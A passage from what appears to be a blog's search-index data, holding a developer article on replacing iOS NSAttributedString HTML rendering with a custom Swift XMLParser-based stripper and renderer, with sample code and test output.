Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }個{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Bold 14.00 pt. P [] (0x13a013870) fobj=0x13a013870, spc=3.46\\\"\";// NSUnderline = 1;// }人身分證字號／護照／居留{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }證號碼{// NSColor = \"UIExtendedSRGBColorSpace 1 0 0 1\";// NSFont = \"\\\".SFNS-Regular 20.00 pt. P [] (0x13a015fa0) fobj=0x13a015fa0, spc=4.82\\\"\";// NSKern = 10;// NSParagraphStyle = \"Alignment 4, LineSpacing 10, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }，以供跨境物流方通關{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }使用{// NSBackgroundColor = \"UIExtendedSRGBColorSpace 0 1 0 1\";// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }，並已了解跨境商品之物流需求{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }顯示結果：Done!這樣我們就完成了透過 XMLParser 自行實現 HTML Render 功能，並且保留擴充性跟規格性，可以從 Code 上管理、了解到目前 App 能支援的字串渲染類型。完整 Github Repo 如下 本文同步發表於個人 Blog： [點我前往] 。 有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,313 Total Views Last Statistics Date: 2025-08-15 | 1,765 Views on Medium." }, { "title": "Implementing iOS NSAttributedString HTML Rendering on Your Own", "url": "/posts/zrealm-dev/en/implementing-ios-nsattributedstring-html-rendering-on-your-own-a8c2d26cc734/", "categories": "ZRealm Dev.", "tags": "ios-app-development, nsattributedstring, html-parsing, html, markdown", "date": "2022-06-10 00:11:59 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Implementing iOS NSAttributedString HTML Rendering on Your OwnAn alternative to iOS ...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Implementing iOS NSAttributedString HTML Rendering on Your OwnAn alternative to iOS NSAttributedString DocumentType.htmlPhoto by Florian Olivo[TL;DR] 2023/03/12I have developed a new tool called “ZMarkupParser HTML String to NSAttributedString Converter” using a different approach. For technical details and the development story, please visit “The Journey of Building an HTML Parser”.BackgroundSince the release of iOS 15 last year, our app has been plagued by a persistent crash issue. Data shows that in the last 90 days (from 2022/03/11 to 2022/06/08), there were over 2,400 crashes affecting more than 1,400 users. This significant crash issue appears to have been addressed (or its occurrence reduced) in subsequent versions after iOS ≥ 15.2, as data shows a downward trend.Most affected versions: iOS 15.0.X to iOS 15.X.XWe also noticed sporadic crashes on iOS 12 and iOS 13, indicating that this issue has likely existed for a long time, but the probability of occurrence in the early versions of iOS 15 was nearly 100%.Cause of the Crashes:&lt;compiler-generated&gt; line 2147483647 specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)The crash occurs when initializing NSAttributedString with Crashed: com.apple.main-thread EXC_BREAKPOINT 0x00000001de9d4e44. It’s also possible that the operation is not happening on the Main Thread.How to Reproduce:When this issue first emerged, our development team was puzzled; we couldn’t find any problems in the crash logs and were unclear about the conditions under which users experienced the crashes. Until one day, by chance, I switched to “Low Power Mode” and triggered the issue! WTF!!!SolutionAfter some searching, I found many similar cases online and discovered the earliest related crash issue inquiry on the App Developer Forums, which received a response from Apple: This is a known iOS Foundation bug that has existed since iOS 12. For rendering complex HTML without usage constraints, please use WKWebView. If there are rendering constraints, you can write your own HTML Parser &amp; Renderer. You can directly use Markdown for rendering constraints: iOS ≥ 15 NSAttributedString can render text in Markdown format. Rendering constraints refer to the formats that the app can support, such as only supporting bold, italic, and hyperlinks.Additional Note: Rendering Complex HTML — Creating a Rich Text EffectYou can coordinate with the backend to create an interface:{ \"content\":[ {\"type\":\"text\",\"value\":\"First paragraph of plain text\"}, {\"type\":\"text\",\"value\":\"Second paragraph of plain text\"}, {\"type\":\"text\",\"value\":\"Third paragraph of plain text\"}, {\"type\":\"text\",\"value\":\"Fourth paragraph of plain text\"}, {\"type\":\"image\",\"src\":\"https://zhgchg.li/logo.png\",\"title\":\"ZhgChgLi\"}, {\"type\":\"text\",\"value\":\"Fifth paragraph of plain text\"} ]}This can be combined with Markdown to support text rendering, or you can refer to Medium’s approach:\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}This means that in the text code in text, and link in text, and ZhgChgLi, and bold, and I, only i:- Characters 5 to 7 should be marked as code (wrapped in `Text` format).- Characters 18 to 22 should be marked as a link (wrapped in [Text](URL) format).- Characters 50 to 63 should be marked as bold (wrapped in *Text* format).- Characters 55 to 69 should be marked as italic (wrapped in _Text_ format).With a defined and describable structure, the app can render natively, optimizing performance and user experience. For pitfalls in using UITextView for rich text, refer to my previous article: iOS UITextView Rich Text Editor (Swift).Why?Before diving into the solution, let’s explore the root of the problem. I believe the main issue does not stem from Apple; the official bug is merely the trigger for this problem.The core issue arises from the app being treated as a web renderer. The advantages are rapid web development, where the same API endpoint can serve HTML without distinguishing between clients, allowing flexible rendering of any desired content. The downsides are that HTML is not a common interface for apps, we cannot expect app engineers to understand HTML, performance is extremely poor, it can only operate on the Main Thread, and results cannot be anticipated during development, making it impossible to confirm supported specifications.Digging deeper, the original requirements were often unclear, and it was uncertain which specifications the app needed to support. In the rush to deliver, HTML was directly used as the interface between the app and the web.Performance IssuesTo supplement the performance aspect, tests show that using NSAttributedString DocumentType.html directly has a speed difference of 5 to 20 times compared to a self-implemented rendering method.Better ApproachSince this is an app, a better approach should start from app development principles. For apps, the cost of adjusting requirements is much higher than for web development. Effective app development should be based on iterative adjustments with clear specifications. We need to confirm the specifications we can support, and if changes are needed later, we can schedule time to expand the specifications. This reduces communication costs and increases work efficiency. Confirm the scope of requirements. Confirm supported specifications. Confirm interface specifications (Markdown/BBCode/… If HTML is still used, it should be constrained, e.g., only using &lt;b&gt;/&lt;i&gt;/&lt;a&gt;/&lt;u&gt;, and developers should be clearly informed in the code). Implement a custom rendering mechanism. Maintain and iterate on supported specifications.[2023/02/27 Updated] [TL;DR]:The method has been updated to avoid using XMLParser, as its fault tolerance is zero:&lt;br&gt; / &lt;Congratulation!&gt; / &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; These three scenarios can cause XMLParser to throw an error and display a blank result. When using XMLParser, the HTML string must fully comply with XML rules, unlike browsers or NSAttributedString.DocumentType.html, which can display errors gracefully.I switched to pure Swift development, using Regex to parse HTML tags and perform tokenization, analyzing and correcting tag validity (fixing unclosed tags and misplaced tags), then converting to an abstract syntax tree. Finally, I used the Visitor Pattern to map HTML tags to abstract styles, resulting in the final NSAttributedString without relying on any parser libraries.How?Now that we have established how to render HTML in NSAttributedString, how can we solve the aforementioned crash and performance issues?Inspired byStripping HTMLBefore discussing HTML rendering, let’s first talk about stripping HTML. As mentioned in the previous section “Why?”, the app should know where it will receive HTML and what HTML it should receive, rather than assuming that the app “might” receive HTML that needs to be stripped. As my former supervisor once said: “Isn’t that just crazy?”Option 1: NSAttributedStringlet data = \"&lt;div&gt;Text&lt;/div&gt;\".data(using: .unicode)!let attributed = try NSAttributedString(data: data, options: [.documentType: NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue], documentAttributes: nil)let string = attributed.string Using NSAttributedString to render HTML and then extracting the string will yield a clean String. The same issues apply as in this chapter: iOS 15 is prone to crashes, has poor performance, and can only operate on the Main Thread.Option 2: RegexhtmlString = \"&lt;div&gt;Test&lt;/div&gt;\"htmlString.replacingOccurrences(of: \"&lt;[^&gt;]+&gt;\", with: \"\", options: .regularExpression, range: nil) The simplest and most effective method. Regex cannot guarantee complete accuracy, e.g., &lt;p foo=\"&gt;now what?\"&gt;Paragraph&lt;/p&gt; is valid HTML but will be stripped incorrectly.Option 3: XMLParserReferencing SwiftRichString, we can use Foundation’s XMLParser to treat HTML as XML and implement our own HTML parser and strip functionality.import UIKit// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLStripper: NSObject, XMLParserDelegate { private static let topTag = \"source\" private var xmlParser: XMLParser private(set) var storedString: String // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(string: String) throws { let xmlString = HTMLStripper.escapeWithUnicodeEntities(string) let xml = \"&lt;\\(HTMLStripper.topTag)&gt;\\(xmlString)&lt;/\\(HTMLStripper.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } self.xmlParser = XMLParser(data: data) self.storedString = \"\" super.init() xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self } /// Parse and generate attributed string. func parse() throws -&gt; String { guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLStripper.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return storedString } // MARK: XMLParserDelegate @objc func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() } @objc func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() } @objc func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) } // MARK: Support Private Methods func foundNewString() { if let currentString = currentString { storedString.append(currentString) self.currentString = nil } } // handle html entity / html hex // Perform string escaping to replace all characters which is not supported by NSXMLParser // into the specified encoding with decimal entity. // For example if your string contains '&amp;' character parser will break the style. // This option is active by default. // ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}let test = \"我&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;同意&lt;/a&gt;提供&lt;b&gt;&lt;i&gt;個&lt;/i&gt;人&lt;/b&gt;身分證字號／護照／居留&lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;證號碼&lt;/span&gt;，以供&lt;i&gt;跨境物流&lt;/i&gt;方通關&lt;span style=\\\"background-color:#00FF00;\\\"&gt;使用&lt;/span&gt;，並已&lt;img src=\\\"g.png\\\"/&gt;了解跨境&lt;br/&gt;商品之物&lt;p&gt;流需&lt;/p&gt;求\"let stripper = try HTMLStripper(string: test)print(try! stripper.parse())// 我同意提供個人身分證字號／護照／居留證號碼，以供跨境物流方通關使用，並已了解跨境商品之物流需求Using Foundation’s XML Parser to handle the string, we implement XMLParserDelegate to store the string in currentString, as the string can sometimes be split into multiple parts. The foundCharacters method may be called multiple times, so when a new string is found, we store the current result and clear currentString. The advantage is that it will also convert HTML entities to actual characters, e.g., &amp;#103; -&gt; g. The advantage is that it handles complex HTML, and if it encounters non-compliant HTML, the XMLParser will fail, e.g., forgetting to close &lt;br&gt; as &lt;br/&gt;. Personally, I believe that if you simply want to strip HTML, Option 2 is the better method. I am introducing this method because rendering HTML uses the same principle, and this serves as a simple example. :)HTML Rendering with XMLParserUsing XMLParser to implement rendering, similar to the stripping process, we can add parsing logic for what rendering method to apply for each tag.Requirements: Support for extending the tags to be parsed. Support for setting default styles for tags, e.g., applying link styles to the &lt;a&gt; tag. Support for parsing style attributes, as HTML may specify styles like style=\"color:red\". Styles should support changing font weight, size, underline, line spacing, letter spacing, background color, and text color. Do not support image tags, table tags, or other more complex tags. You can adjust the functionality according to your specific requirements. For example, if you don’t need to support background color adjustments, you can omit that option.The following text is a conceptual implementation and not a best practice in architecture. If there are clear specifications or usage methods, consider applying some design patterns to achieve better maintainability and extensibility.⚠️⚠️⚠️ Attention ⚠️⚠️⚠️Just a reminder, if your app is brand new or has the opportunity to be completely converted to Markdown format, it is still recommended to use the above method. Writing your own renderer is too complex and won’t perform better than Markdown. Even if you are using iOS &lt; 15, which does not support native Markdown, you can still find a great Markdown Parser solution on GitHub.HTMLTagParserprotocol HTMLTagParser { static var tag: String { get } // Declare the tag name to be parsed, e.g., a var storedHTMLAttributes: [String: String]? { get set } // Attributed parsing results will be stored here, e.g., href, style var style: AttributedStringStyle? { get } // The style to be applied to this tag func render(attributedString: inout NSMutableAttributedString) // Implement the logic to render HTML to attributedString}This declares the HTML tag entities that can be parsed, making it easier to manage and extend.AttributedStringStyleprotocol AttributedStringStyle { var font: UIFont? { get set } var color: UIColor? { get set } var backgroundColor: UIColor? { get set } var wordSpacing: CGFloat? { get set } var paragraphStyle: NSParagraphStyle? { get set } var customs: [NSAttributedString.Key: Any]? { get set } // A universal setting interface; it is recommended to abstract this out after confirming supported specifications and close this interface func render(attributedString: inout NSMutableAttributedString)}// Abstract implementationextension AttributedStringStyle { func render(attributedString: inout NSMutableAttributedString) { let range = NSMakeRange(0, attributedString.length) if let font = font { attributedString.addAttribute(NSAttributedString.Key.font, value: font, range: range) } if let color = color { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) } if let backgroundColor = backgroundColor { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: backgroundColor, range: range) } if let wordSpacing = wordSpacing { attributedString.addAttribute(NSAttributedString.Key.kern, value: wordSpacing as Any, range: range) } if let paragraphStyle = paragraphStyle { attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) } if let customAttributes = customs { attributedString.addAttributes(customAttributes, range: range) } }}This declares the styles that can be set for the tags.HTMLStyleAttributedParser// Only supports the tag attributes listed below// Can set color, font size, line height, word spacing, background colorenum HTMLStyleAttributedParser: String { case color = \"color\" case fontSize = \"font-size\" case lineHeight = \"line-height\" case wordSpacing = \"word-spacing\" case backgroundColor = \"background-color\" func render(attributedString: inout NSMutableAttributedString, value: String) -&gt; Bool { let range = NSMakeRange(0, attributedString.length) switch self { case .color: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) return true } case .backgroundColor: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: color, range: range) return true } case .fontSize: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.font, value: UIFont.systemFont(ofSize: CGFloat(size)), range: range) return true } case .lineHeight: if let size = convertToiOSSize(value) { let paragraphStyle = NSMutableParagraphStyle() paragraphStyle.lineSpacing = size attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) return true } case .wordSpacing: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.kern, value: size, range: range) return true } } return false } // Convert 36px -&gt; 36 private func convertToiOSSize(_ string: String) -&gt; CGFloat? { guard let regex = try? NSRegularExpression(pattern: \"^([0-9]+)\"), let firstMatch = regex.firstMatch(in: string, options: [], range: NSRange(location: 0, length: string.utf16.count)), let range = Range(firstMatch.range, in: string), let size = Float(String(string[range])) else { return nil } return CGFloat(size) } // Convert HTML hex color #ffffff to UIKit Color private func convertToiOSColor(_ hexString: String) -&gt; UIColor? { var cString: String = hexString.trimmingCharacters(in: .whitespacesAndNewlines).uppercased() if cString.hasPrefix(\"#\") { cString.remove(at: cString.startIndex) } if (cString.count) != 6 { return nil } var rgbValue: UInt64 = 0 Scanner(string: cString).scanHexInt64(&amp;rgbValue) return UIColor( red: CGFloat((rgbValue &amp; 0xFF0000) &gt;&gt; 16) / 255.0, green: CGFloat((rgbValue &amp; 0x00FF00) &gt;&gt; 8) / 255.0, blue: CGFloat(rgbValue &amp; 0x0000FF) / 255.0, alpha: CGFloat(1.0) ) }}This implements the Style Attributed Parser to parse style=\"color:red;font-size:16px\", but since CSS Style has many configurable styles, it is necessary to enumerate the supported range.extension HTMLTagParser { func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) } func defaultStyleRender(attributedString: inout NSMutableAttributedString) { // Setup default style to NSMutableAttributedString style?.render(attributedString: &amp;attributedString) // Setup &amp; override HTML style (style=\"color:red;background-color:black\") to NSMutableAttributedString if it exists // Any HTML tag can have a style attribute if let style = storedHTMLAttributes?[\"style\"] { let styles = style.split(separator: \";\").map { $0.split(separator: \":\") }.filter { $0.count == 2 } for style in styles { let key = String(style[0]) let value = String(style[1]) if let styleAttributed = HTMLStyleAttributedParser(rawValue: key), styleAttributed.render(attributedString: &amp;attributedString, value: value) { print(\"Unsupported style attribute or value[\\(key):\\(value)]\") } } } }}This applies the HTMLStyleAttributedParser &amp; HTMLStyleAttributedParser abstract implementation.Examples of Some Tag Parsers &amp; AttributedStringStyle Implementationsstruct LinkStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14) var color: UIColor? = UIColor.blue var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct ATagParser: HTMLTagParser { // &lt;a&gt;&lt;/a&gt; static let tag: String = \"a\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = LinkStyle() func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) if let href = storedHTMLAttributes?[\"href\"], let url = URL(string: href) { let range = NSMakeRange(0, attributedString.length) attributedString.addAttribute(NSAttributedString.Key.link, value: url, range: range) } }}struct BoldStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14, weight: .bold) var color: UIColor? = UIColor.black var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct BoldTagParser: HTMLTagParser { // &lt;b&gt;&lt;/b&gt; static let tag: String = \"b\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = BoldStyle()}HTMLToAttributedStringParser: Core Implementation of XMLParserDelegate// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLToAttributedStringParser: NSObject { private static let topTag = \"source\" private var xmlParser: XMLParser? private(set) var attributedString: NSMutableAttributedString = NSMutableAttributedString() private(set) var supportedTagRenders: [HTMLTagParser] = [] private let defaultStyle: AttributedStringStyle /// Styles applied at each fragment. private var renderingTagRenders: [HTMLTagParser] = [] // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(defaultStyle: AttributedStringStyle) { self.defaultStyle = defaultStyle super.init() } func register(_ tagRender: HTMLTagParser) { if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == type(of: tagRender).tag }) { supportedTagRenders.remove(at: index) } supportedTagRenders.append(tagRender) } /// Parse and generate attributed string. func parse(string: String) throws -&gt; NSAttributedString { var xmlString = HTMLToAttributedStringParser.escapeWithUnicodeEntities(string) // Make sure &lt;br/&gt; format is correct XML // Because web may use &lt;br&gt; to present &lt;br/&gt;, but &lt;br&gt; is not a valid XML xmlString = xmlString.replacingOccurrences(of: \"&lt;br&gt;\", with: \"&lt;br/&gt;\") let xml = \"&lt;\\(HTMLToAttributedStringParser.topTag)&gt;\\(xmlString)&lt;/\\(HTMLToAttributedStringParser.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } let xmlParser = XMLParser(data: data) xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self self.xmlParser = xmlParser attributedString = NSMutableAttributedString() guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLToAttributedStringParser.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return attributedString }}// MARK: Private Methodprivate extension HTMLToAttributedStringParser { func enter(element elementName: String, attributes: [String: String]) { // elementName = tagName, EX: a, span, div... guard elementName != HTMLToAttributedStringParser.topTag else { return } if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == elementName }) { var tagRender = supportedTagRenders[index] tagRender.storedHTMLAttributes = attributes renderingTagRenders.append(tagRender) } } func exit(element elementName: String) { if !renderingTagRenders.isEmpty { renderingTagRenders.removeLast() } } func foundNewString() { if let currentString = currentString { // currentString != nil, ex: &lt;i&gt;currentString&lt;/i&gt; var newAttributedString = NSMutableAttributedString(string: currentString) if !renderingTagRenders.isEmpty { for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } } else { defaultStyle.render(attributedString: &amp;newAttributedString) } attributedString.append(newAttributedString) self.currentString = nil } else { // currentString == nil, ex: &lt;br/&gt; var newAttributedString = NSMutableAttributedString() for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } attributedString.append(newAttributedString) } }}// MARK: Helperextension HTMLToAttributedStringParser { // Handle HTML entity / HTML hex // Perform string escaping to replace all characters which are not supported by NSXMLParser // into the specified encoding with decimal entity. // For example, if your string contains '&amp;' character, the parser will break the style. // This option is active by default. // Ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}// MARK: XMLParserDelegateextension HTMLToAttributedStringParser: XMLParserDelegate { func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() enter(element: elementName, attributes: attributeDict) } func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() guard elementName != HTMLToAttributedStringParser.topTag else { return } exit(element: elementName) } func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) }}By applying the logic of stripping, we can combine the structured components within it, using elementName to identify the current tag and apply the corresponding Tag Parser along with the defined styles.Test Resultlet test = \"我&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;同意&lt;/a&gt;提供&lt;b&gt;&lt;i&gt;個&lt;/i&gt;人&lt;/b&gt;身分證字號／護照／居留&lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;證號碼&lt;/span&gt;，以供&lt;i&gt;跨境物流&lt;/i&gt;方通關&lt;span style=\\\"background-color:#00FF00;\\\"&gt;使用&lt;/span&gt;，並已&lt;img src=\\\"g.png\\\"/&gt;了解跨境&lt;br/&gt;商品之物&lt;p&gt;流需&lt;/p&gt;求\"let render = HTMLToAttributedStringParser(defaultStyle: DefaultTextStyle())render.register(ATagParser())render.register(BoldTagParser())render.register(SpanTagParser())//...print(try! render.parse(string: test))**Display Result:**![](/assets/a8c2d26cc734/1*LaKhRLhHm2jfptG4h_jB5Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NzEiIGhlaWdodD0iNDkiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }### Done!We have successfully implemented HTML rendering functionality using XMLParser, while maintaining extensibility and compliance with specifications. This allows us to manage and understand the types of string rendering currently supported by the app through the code.### Complete GitHub Repository:[![](https://opengraph.githubassets.com/c021159c3da82c37ff65d210c7a64aa4e56e398964b824baf4f248bb25bdb805/zhgchgli0718/HTMLToAttributedStringRednerExample)](https://github.com/zhgchgli0718/HTMLToAttributedStringRednerExample){:target=\"_blank\"}&gt; _This article is also published on my personal blog: [**\\[Click here to visit\\]**](/posts/zrealm-dev/en/implementing-ios-nsattributedstring-html-rendering-on-your-own-a8c2d26cc734/)._&gt; _If you have any questions or feedback, feel free to [contact 